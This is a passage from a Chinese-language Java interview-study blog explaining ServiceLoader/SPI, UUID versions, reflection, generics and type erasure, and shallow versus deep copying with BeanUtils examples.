<span class="keyword">private</span> <span class="keyword">final</span> Class&lt;S&gt; service;</span><br><span class="line">    <span class="comment">// 用于定位，加载和实例化providers的类加载器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader loader;</span><br><span class="line">    <span class="comment">// 创建ServiceLoader时采用的访问控制上下文</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AccessControlContext acc;</span><br><span class="line">    <span class="comment">// 缓存providers，按实例化的顺序排列</span></span><br><span class="line">    <span class="keyword">private</span> LinkedHashMap&lt;String,S&gt; providers = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 懒查找迭代器</span></span><br><span class="line">    <span class="keyword">private</span> LazyIterator lookupIterator;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考具体源码，梳理了一下，实现的流程如下：</p>
<ol>
<li>应用程序调用ServiceLoader.load方法，ServiceLoader.load方法内先创建一个新的ServiceLoader，并实例化该类中的成员变量，包括：<ol>
<li>loader(ClassLoader类型，类加载器)</li>
<li>acc(AccessControlContext类型，访问控制器)</li>
<li>providers(LinkedHashMap类型，用于缓存加载成功的类)</li>
<li>lookupIterator(实现迭代器功能)</li>
</ol>
</li>
<li>应用程序通过迭代器接口获取对象实例，<ol>
<li>ServiceLoader先判断成员变量providers对象中(LinkedHashMap类型)是否有缓存实例对象，如果有缓存，直接返回。</li>
<li>如果没有缓存，执行类的装载：<ol>
<li>读取META-INF&#x2F;services&#x2F;下的配置文件，获得所有能被实例化的类的名称</li>
<li>通过反射方法Class.forName()加载类对象，并用instance()方法将类实例化</li>
<li>把实例化后的类缓存到providers对象中(LinkedHashMap类型）</li>
<li>然后返回实例对象。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="SPI的应用场景"><a href="#SPI的应用场景" class="headerlink" title="SPI的应用场景"></a>SPI的应用场景</h2><p>概括地说，适用于：调用者根据实际使用需要，启用、扩展、或者替换框架的实现策略。比较常见的例子：</p>
<ol>
<li>数据库驱动加载接口实现类的加载</li>
<li>JDBC加载不同类型数据库的驱动</li>
<li>日志门面接口实现类加载</li>
<li>SLF4J加载不同提供商的日志实现类</li>
</ol>
<p><strong>Spring</strong></p>
<p>Spring中大量使用了SPI,比如：对servlet3.0规范对ServletContainerInitializer的实现、自动类型转换Type Conversion SPI(Converter SPI、Formatter SPI)等</p>
<p><strong>Dubbo</strong></p>
<p>Dubbo中也大量使用SPI的方式实现框架的扩展, 不过它对Java提供的原生SPI做了封装，允许用户扩展实现Filter接口</p>
<h1 id="✅什么是UUID，能保证唯一吗？"><a href="#✅什么是UUID，能保证唯一吗？" class="headerlink" title="✅什么是UUID，能保证唯一吗？"></a>✅什么是UUID，能保证唯一吗？</h1><h2 id="典型回答-7"><a href="#典型回答-7" class="headerlink" title="典型回答"></a>典型回答</h2><p><strong>UUID(Universally Unique Identifier)全局唯一标识符，是指在一台机器上生成的数字，它的目标是保证对在同一时空中的所有机器都是唯一的。</strong></p>
<hr>
<p>UUID 的生成是基于一定算法，通常使用的是随机数生成器或者基于时间戳的方式，生成的 UUID 由 32 位 16 进制数表示，共有 128 位（标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)，共32个字符）</p>
<p><strong>由于 UUID 是由 MAC 地址、时间戳、随机数等信息生成的，因此 UUID 具有极高的唯一性，可以说是几乎不可能重复，但是在实际实现过程中，UUID有多种实现版本，他们的唯一性指标也不尽相同。</strong></p>
<hr>
<p>UUID在具体实现上，有多个版本，有基于时间的UUID V1，基于随机数的 UUID V4等。</p>
<p>Java中的java.util.UUID生成的UUID是V3和V4两种：</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/nlx-ytdhzDlp59yU/1669638424320-b15cfa40-ffc2-4ca0-9b61-78fccdf450cc-787098.png" alt="1669638424320-b15cfa40-ffc2-4ca0-9b61-78fccdf450cc.png"></p>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p><strong>UUID的优点就是他的性能比较高，不依赖网络，本地就可以生成，使用起来也比较简单。</strong></p>
<hr>
<p><strong>但是他也有两个比较明显的缺点，那就是长度过长和没有任何含义</strong>。长度自然不必说，他有32位16进制数字。对于”550e8400-e29b-41d4-a716-446655440000”这个字符串来说，我想任何一个程序员都看不出其表达的含义。一旦使用它作为全局唯一标识，就意味着在日后的问题排查和开发调试过程中会遇到很大的困难。</p>
<h4 id="各个版本实现"><a href="#各个版本实现" class="headerlink" title="各个版本实现"></a>各个版本实现</h4><p><strong>V1. 基于时间戳的UUID</strong></p>
<p>基于时间的UUID通过计算当前时间戳、随机数和机器MAC地址得到。<strong>由于在算法中使用了MAC地址，这个版本的UUID可以保证在全球范围的唯一性。</strong></p>
<p>但与此同时，使用MAC地址会带来安全性问题，这就是这个版本UUID受到批评的地方。如果应用只是在局域网中使用，也可以使用退化的算法，以IP地址来代替MAC地址。</p>
<blockquote>
<p>MAC地址是与设备硬件直接关联的唯一标识符。通过获取到同一个 MAC 地址生成的大量UUID，可以被恶意用户或第三方通过反向工程解析出MAC地址，进而获取到设备的物理位置或用户身份信息。</p>
<p>在某些情况下，如果MAC地址被泄露，它可能被用于针对特定设备的网络攻击。</p>
</blockquote>
<p><strong>V2. DCE(Distributed Computing Environment)安全的UUID</strong></p>
<p>和基于时间的UUID算法相同，但会把时间戳的前4位置换为POSIX的UID或GID，这个版本的UUID在实际中较少用到。</p>
<p><strong>V3. 基于名称空间的UUID(MD5)</strong></p>
<p>基于名称的UUID通过计算名称和名称空间的MD5散列值得到。</p>
<p><strong>这个版本的UUID保证了：相同名称空间中不同名称生成的UUID的唯一性；不同名称空间中的UUID的唯一性；相同名称空间中相同名称的UUID重复生成得到的结果是相同的。</strong></p>
<p><strong>V4. 基于随机数的UUID</strong></p>
<p>根据随机数，或者伪随机数生成UUID。该版本 UUID 采用随机数生成器生成，它可以保证生成的 UUID 具有极佳的唯一性。但是因为基于随机数的，所以，并不适合数据量特别大的场景。</p>
<p><strong>V5. 基于名称空间的UUID(SHA1)</strong></p>
<p>和版本3的UUID算法类似，只是散列值计算使用SHA1(Secure Hash Algorithm 1)算法。</p>
<h4 id="各个版本总结"><a href="#各个版本总结" class="headerlink" title="各个版本总结"></a>各个版本总结</h4><p>可以简单总结一下，Version 1和Version 2 这两个版本的UUID，主要基于时间和MAC地址，所以比较适合应用于分布式计算环境下，具有高度唯一性。</p>
<p>Version 3和 Version 5 这两种UUID都是基于名称空间的，所以在一定范围内是唯一的，而且如果有需要生成重复UUID的场景的话，这两种是可以实现的。</p>
<p>Version 4 这种是最简单的，只是基于随机数生成的，但是也是最不靠谱的。适合数据量不是特别大的场景下</p>
<h1 id="✅什么是反射机制？为什么反射慢？"><a href="#✅什么是反射机制？为什么反射慢？" class="headerlink" title="✅什么是反射机制？为什么反射慢？"></a>✅什么是反射机制？为什么反射慢？</h1><h2 id="典型回答-8"><a href="#典型回答-8" class="headerlink" title="典型回答"></a>典型回答</h2><p>反射机制指的是程序在<strong>运行时</strong>能够获取自身的信息。在java中，只要给定类的名字，那么就可以通过反射机制来获得类的所有属性和方法。  </p>
<p>Java的反射可以：</p>
<ol>
<li>在运行时判断任意一个对象所属的类。</li>
<li>在运行时判断任意一个类所具有的成员变量和方法。</li>
<li>在运行时任意调用一个对象的方法</li>
<li>在运行时构造任意一个类的对象</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="comment">// ... 任意对象;</span></span><br><span class="line">Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取成员变量</span></span><br><span class="line">Field[] fields = clazz.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;成员变量: &quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取方法</span></span><br><span class="line">Method[] methods = clazz.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;方法: &quot;</span> + method.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;methodName&quot;</span>, <span class="comment">/*方法参数类型...*/</span>);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>); <span class="comment">// 如果方法是私有的</span></span><br><span class="line">method.invoke(obj, <span class="comment">/* 方法参数...*/</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认构造函数</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者使用特定的构造函数</span></span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getConstructor(<span class="comment">/* 参数类型...*/</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="comment">/* 构造函数参数...*/</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>反射的好处就是可以提升程序的灵活性和扩展性，比较容易在运行期干很多事情。但是他带来的问题更多，主要由以下几个：</p>
<p>1、代码可读性低及可维护性</p>
<p>2、反射代码执行的性能低</p>
<p>3、反射破坏了封装性</p>
<p>所以，我们应该在业务代码中应该尽量避免使用反射。但是，作为一个合格的Java开发，也要能读懂中间件、框架中的反射代码。在有些场景下，要知道可以使用反射解决部分问题。</p>
<p>那么，反射为什么慢呢？主要由以下几个原因：</p>
<p>1、由于反射涉及动态解析的类型，<strong>因此不能执行某些Java虚拟机优化</strong>，如JIT优化。</p>
<p>2、在使用反射时，参数需要包装（<strong>boxing</strong>)成Object[] 类型，但是真正方法执行的时候，又需要再拆包（<strong>unboxing</strong>)成真正的类型，这些动作不仅消耗时间，而且过程中也会产生很多对象，对象一多就容易导致GC，GC也会导致应用变慢。</p>
<p>3、反射调用方法时会从方法数组中遍历查找，并且会检查可见性。这些动作都是耗时的。</p>
<p>4、不仅方法的可见性要做检查，参数也需要做很多额外的检查。</p>
<h2 id="扩展知识-2"><a href="#扩展知识-2" class="headerlink" title="扩展知识"></a>扩展知识</h2><h2 id="反射常见的应用场景"><a href="#反射常见的应用场景" class="headerlink" title="反射常见的应用场景"></a>反射常见的应用场景</h2><ol>
<li>动态代理</li>
<li>JDBC的class.forName</li>
<li>BeanUtils中属性值的拷贝</li>
<li>RPC框架</li>
<li>ORM框架</li>
<li>Spring的IOC&#x2F;DI</li>
</ol>
<h2 id="反射和Class的关系"><a href="#反射和Class的关系" class="headerlink" title="反射和Class的关系"></a>反射和Class的关系</h2><p>Java的Class类是java反射机制的基础,通过Class类我们可以获得关于一个类的相关信息</p>
<p>Java.lang.Class是一个比较特殊的类，它用于封装被装入到JVM中的类（包括类和接口）的信息。当一个类或接口被装入到JVM时便会产生一个与之关联的java.lang.Class对象，可以通过这个Class对象对被装入类的详细信息进行访问。</p>
<p>虚拟机为每种类型管理一个独一无二的Class对象。也就是说，每个类（型）都有一个Class对象。运行程序时，Java虚拟机(JVM)首先检查是否所要加载的类对应的Class对象是否已经加载。如果没有加载，JVM就会根据类名查找.class文件，并将其Class对象载入。</p>
<h1 id="✅什么是泛型？有什么好处？"><a href="#✅什么是泛型？有什么好处？" class="headerlink" title="✅什么是泛型？有什么好处？"></a>✅什么是泛型？有什么好处？</h1><h2 id="典型回答-9"><a href="#典型回答-9" class="headerlink" title="典型回答"></a>典型回答</h2><p>Java泛型（generics） 是JDK 5中引入的一个新特性，允许在定义类和接口的时候使用类型参数（type parameter）。声明的类型参数在使用时用具体的类型来替换。泛型最主要的应用是在JDK 5中的新集合类框架中。</p>
<p>泛型的好处有两个：</p>
<ol>
<li>方便：可以提高代码的复用性。以List接口为例，我们可以将String、Integer等类型放入List中，如不用泛型，存放String类型要写一个List接口，存放Integer要写另外一个List接口，泛型可以很好的解决这个问题</li>
<li>安全：在泛型出之前，通过Object实现的类型转换需要在运行时检查，如果类型转换出错，程序直接GG，可能会带来毁灭性打击。而泛型的作用就是在编译时做类型检查，这无疑增加程序的安全性</li>
</ol>
<h2 id="知识扩展-3"><a href="#知识扩展-3" class="headerlink" title="知识扩展"></a>知识扩展</h2><h2 id="泛型是如何实现的"><a href="#泛型是如何实现的" class="headerlink" title="泛型是如何实现的"></a>泛型是如何实现的</h2><p>Java中的泛型通过<strong>类型擦除</strong>的方式来实现，通俗点理解，就是通过语法糖的形式，在.java-&gt;.class转换的阶段，将<code>List&lt;String&gt;</code>擦除调转为List的手段。换句话说，Java的泛型只在编译期，Jvm是不会感知到泛型的。</p>
<h2 id="类型擦除的缺点有哪些？"><a href="#类型擦除的缺点有哪些？" class="headerlink" title="类型擦除的缺点有哪些？"></a>类型擦除的缺点有哪些？</h2><ol>
<li>泛型不可以重载</li>
<li>泛型异常类不可以多次catch</li>
<li>泛型类中的静态变量也只有一份，不会有多份</li>
</ol>
<h2 id="对泛型通配符的理解"><a href="#对泛型通配符的理解" class="headerlink" title="对泛型通配符的理解"></a>对泛型通配符的理解</h2><h2 id="List-List-List之间的区别"><a href="#List-List-List之间的区别" class="headerlink" title="List&lt;?&gt;, List&lt;Object&gt;, List之间的区别"></a><code>List&lt;?&gt;, List&lt;Object&gt;, List</code>之间的区别</h2><ol>
<li><code>List&lt;?&gt;</code> 是一个未知类型的List，而<code>List&lt;Object&gt;</code> 其实是任意类型的List。可以把<code>List&lt;String&gt;</code>, <code>List&lt;Integer&gt;</code>赋值给<code>List&lt;?&gt;</code>，却不能把<code>List&lt;String&gt;</code>赋值给 <code>List&lt;Object&gt;</code></li>
<li>可以把任何带参数的类型传递给原始类型List，但却不能把<code>List&lt;String&gt;</code>赋值给<code>List&lt;Object&gt;</code>，因为会产生编译错误（不支持协变）</li>
<li><code>List&lt;?&gt;</code>由于不确定列表中元素的具体类型，因此只能从这种列表中读取数据，而不能往里面添加除了 null 之外的任何元素。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/F7J1n13mdPskXrlH/1703322631480-b31e952c-b076-48ee-b01a-2a56c65c9a5c-858317.png" alt="1703322631480-b31e952c-b076-48ee-b01a-2a56c65c9a5c.png"></p>
<h2 id="在泛型为Integer的ArrayList中存放一个String类型的对象"><a href="#在泛型为Integer的ArrayList中存放一个String类型的对象" class="headerlink" title="在泛型为Integer的ArrayList中存放一个String类型的对象"></a>在泛型为Integer的ArrayList中存放一个String类型的对象</h2><p>通过反射可以实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> list.getClass().getMethod(<span class="string">&quot;add&quot;</span>, Object.class);</span><br><span class="line">    method.invoke(list, <span class="string">&quot;Java反射机制实例&quot;</span>);</span><br><span class="line">    System.out.println(list.get(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="对数组协变和泛型非协变的理解"><a href="#对数组协变和泛型非协变的理解" class="headerlink" title="对数组协变和泛型非协变的理解"></a>对数组协变和泛型非协变的理解</h2><p>所谓协变，可以简单理解为因为Object是String的父类，所以Object[]同样是String[]的父类，这种情况Java是允许的；但是对于泛型来说，<code>List&lt;Object&gt;</code>和<code>List&lt;String&gt;</code>半毛钱关系都没有</p>
<p>为什么要这样设计呢，如果泛型允许协变（实际上以下代码第一步就会编译失败），考虑如下例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Object&gt; a = <span class="keyword">new</span> <span class="title class_">List</span>&lt;String&gt;();</span><br><span class="line">a.add(<span class="number">1</span>); <span class="comment">// 允许协变，可以装进来</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> a.get(<span class="number">0</span>); <span class="comment">// 编译报错</span></span><br></pre></td></tr></table></figure>

<p>但是，为什么泛型不允许协变，而数组允许协变呢？原因有二：</p>
<ol>
<li>因为数组设计之初没有泛型，为了兼容考虑，如<code>Arrays.equals(Object[], Object[])</code>方法，是时代无奈的产物</li>
<li>数组也属于对象，它记录了引用实际的类型，在放入数组的时候，如果类型不一样就会报错，而不是等到拿出来的时候才发现问题，相对来说安全一点</li>
</ol>
<h1 id="✅什么是类型擦除？"><a href="#✅什么是类型擦除？" class="headerlink" title="✅什么是类型擦除？"></a>✅什么是类型擦除？</h1><h2 id="典型回答-10"><a href="#典型回答-10" class="headerlink" title="典型回答"></a>典型回答</h2><p>类型擦除是Java在处理泛型的一种方式，如Java的编译器在编译以下代码时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Foo&lt;T&gt; &#123;</span><br><span class="line">    T bar;</span><br><span class="line">    void doSth(T param) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Foo&lt;String&gt; f1;</span><br><span class="line">Foo&lt;Integer&gt; f2;</span><br></pre></td></tr></table></figure>



<p>在编译后的字节码文件中，会把泛型的信息擦除掉：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Foo &#123;</span><br><span class="line">    Object bar;</span><br><span class="line">    void doSth(Object param) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>也就是说，在代码中的Foo<String> 和 Foo<Integer>使用的类，经过编译后都是同一个类。</p>
<p>所以说泛型技术实际上是Java语言的一颗语法糖，因为泛型经过编译器处理之后就被擦除了。</p>
<p>这种擦除的过程，被称之为——类型擦除。所以类型擦除指的是通过类型参数合并，将泛型类型实例关联到同一份字节码上。编译器只为泛型类型生成一份字节码，并将其实例关联到这份字节码上。类型擦除的关键在于从泛型类型中清除类型参数的相关信息，并且在必要的时候添加类型检查和类型转换的方法。</p>
<p><strong>类型擦除可以简单的理解为将泛型java代码转换为普通java代码，只不过编译器更直接点，将泛型java代码直接转换成普通java字节码。</strong></p>
<h2 id="扩展知识-3"><a href="#扩展知识-3" class="headerlink" title="扩展知识"></a>扩展知识</h2><h2 id="C语言对泛型的支持"><a href="#C语言对泛型的支持" class="headerlink" title="C语言对泛型的支持"></a>C语言对泛型的支持</h2><p>泛型是一种编程范式，在不同的语言和编译器中的实现和支持方式都不一样。</p>
<p>通常情况下，一个编译器处理泛型有多种方式，在C++中，当编译器对以下代码编译时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">struct Foo</span><br><span class="line">&#123;</span><br><span class="line">    T bar;</span><br><span class="line">    void doSth(T param) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Foo&lt;int&gt; f1;</span><br><span class="line">Foo&lt;float&gt; f2;</span><br></pre></td></tr></table></figure>



<p>当编译器对其进行编译时，编译器发现要用到Foo<int>和Foo<float>，这时候就会为每一个泛型类新生成一份执行代码。相当于新创建了如下两个类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct FooInt</span><br><span class="line">&#123;</span><br><span class="line">    int bar;</span><br><span class="line">    void doSth(int param) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct FooFloat</span><br><span class="line">&#123;</span><br><span class="line">    float bar;</span><br><span class="line">    void doSth(float param) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>这种做法，用起来的时候很方便，只需要根据具体类型找到具体的的类和方法就行了。但是问题是，当我们多次使用不同类型的模板时，就会创建出来的很多新的类，就会导致代码膨胀。</p>
<h1 id="✅什么是深拷贝和浅拷贝？"><a href="#✅什么是深拷贝和浅拷贝？" class="headerlink" title="✅什么是深拷贝和浅拷贝？"></a>✅什么是深拷贝和浅拷贝？</h1><h2 id="典型回答-11"><a href="#典型回答-11" class="headerlink" title="典型回答"></a>典型回答</h2><p>在计算机内存中，每个对象都有一个地址，这个地址指向对象在内存中存储的位置。当我们使用变量引用一个对象时，实际上是将该对象的地址赋值给变量。因此，如果我们将一个对象复制到另一个变量中，实际上是将对象的地址复制到了这个变量中。</p>
<p>**浅拷贝是指将一个对象复制到另一个变量中，但是只复制对象的地址，而不是对象本身。也就是说，原始对象和复制对象实际上是共享同一个内存地址的。**因此，如果我们修改了复制对象中的属性或元素，原始对象中对应的属性或元素也会被修改。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/jSd6ZcfeeU0U9okU/1676783507992-17834cb9-e2a9-4e59-aba7-5153a32a5ef5-943283.png" alt="1676783507992-17834cb9-e2a9-4e59-aba7-5153a32a5ef5.png"></p>
<p>在Java中，我们常用的各种BeanUtils基本也都是浅拷贝的。</p>
<blockquote>
<p>适用场景：浅拷贝的好处就是性能比较好，他只需要做一个引用的地址复制即可。当我们希望不同的对象，如对象1和对象2共享部分数据的时候，可以使用浅拷贝。或者对于一些简单的对象，比如没有很复杂的对象嵌套时，就可以用浅拷贝。</p>
</blockquote>
<p>**深拷贝是指将一个对象及其所有子对象都复制到另一个变量中，也就是说，它会创建一个全新的对象，并将原始对象中的所有属性或元素都复制到新的对象中。**因此，如果我们修改复制对象中的属性或元素，原始对象中对应的属性或元素不会受到影响。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/jSd6ZcfeeU0U9okU/1676783597206-2d0338bb-15c2-438e-8692-f17d01aa9fb6-661029.png" alt="1676783597206-2d0338bb-15c2-438e-8692-f17d01aa9fb6.png"></p>
<p>比如我们有一个User类，然后他的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String password;</span><br><span class="line">    private Address address;</span><br><span class="line">    //省略构造函数和setter/getter</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Address &#123;</span><br><span class="line">    private String province;</span><br><span class="line">    private String city;</span><br><span class="line">    private String area;</span><br><span class="line">    //省略构造函数和setter/getter</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>当我们基于User类的一个对象user1拷贝出一个新的对象user2的时候，不管怎么样，user1和user2都是两个不同的对象，他们的地址也不会一样。但是其中的成员变量Address的话可能就因为深浅拷贝的不同而呈现不同的现象了。</p>
<p>如果是浅拷贝，那么user2中的address会和user1中的address共享同一个地址，当其中一个修改时，另一个也会受影响。</p>
<p>如果是深拷贝，那么user2中的address会和user1中的address并不是同一个地址，当其中一个修改时，另一个是不会受影响的。</p>
<blockquote>
<p>适用场景：深拷贝的好处就是两个对象完全隔离。当我们需要完全独立的对象副本，且原始对象和副本之间的操作互不影响时，深拷贝是必须的。对于包含嵌套对象或复杂引用关系的对象，通常需要深拷贝以确保所有层级的数据都被复制。</p>
</blockquote>
<h2 id="扩展知识-4"><a href="#扩展知识-4" class="headerlink" title="扩展知识"></a>扩展知识</h2><h2 id="BeanUtils的浅拷贝"><a href="#BeanUtils的浅拷贝" class="headerlink" title="BeanUtils的浅拷贝"></a>BeanUtils的浅拷贝</h2><p>我们举个实际例子，来看下为啥前面说BeanUtils.copyProperties的过程是浅拷贝。</p>
<p>先来定义两个类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Address &#123;</span><br><span class="line">    private String province;</span><br><span class="line">    private String city;</span><br><span class="line">    private String area;</span><br><span class="line">    //省略构造函数和setter/getter</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String password;</span><br><span class="line">    private Address address;</span><br><span class="line">    //省略构造函数和setter/getter</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后写一段测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User user = new User(&quot;Hollis&quot;, &quot;hollischuang&quot;);</span><br><span class="line">user.setAddress(new Address(&quot;zhejiang&quot;, &quot;hangzhou&quot;, &quot;binjiang&quot;));</span><br><span class="line"></span><br><span class="line">User newUser = new User();</span><br><span class="line">BeanUtils.copyProperties(user, newUser);</span><br><span class="line"></span><br><span class="line">System.out.println(user == newUser);</span><br><span class="line">System.out.println(user.getAddress() == newUser.getAddress());</span><br></pre></td></tr></table></figure>



<p>以上代码输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">false</span><br><span class="line">true</span><br></pre></td></tr></table></figure>



<p>即，我们BeanUtils.copyProperties拷贝出来的newUser是一个新的对象，但是，其中的address对象和原来的user中的address对象是同一个对象。</p>
<p>如果我们修改newUser中的Address对象的值的话，是会同时把user对象中的Address的值也修改了的。可以尝试着修改下newUser中的address对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newUser.getAddress().setCity(&quot;shanghai&quot;);</span><br><span class="line">System.out.println(JSON.toJSONString(user));</span><br><span class="line">System.out.println(JSON.toJSONString(newUser));</span><br></pre></td></tr></table></figure>



<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;address&quot;:&#123;&quot;area&quot;:&quot;binjiang&quot;,&quot;city&quot;:&quot;shanghai&quot;,&quot;province&quot;:&quot;zhejiang&quot;&#125;,&quot;name&quot;:&quot;Hollis&quot;,&quot;password&quot;:&quot;hollischuang&quot;&#125;</span><br><span class="line">&#123;&quot;address&quot;:&#123;&quot;area&quot;:&quot;binjiang&quot;,&quot;city&quot;:&quot;shanghai&quot;,&quot;province&quot;:&quot;zhejiang&quot;&#125;,&quot;name&quot;:&quot;Hollis&quot;,&quot;password&quot;:&quot;hollischuang&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="实现深拷贝"><a href="#实现深拷贝" class="headerlink" title="实现深拷贝"></a>实现深拷贝</h2><p>如何实现深拷贝呢，主要有以下几个方法：</p>
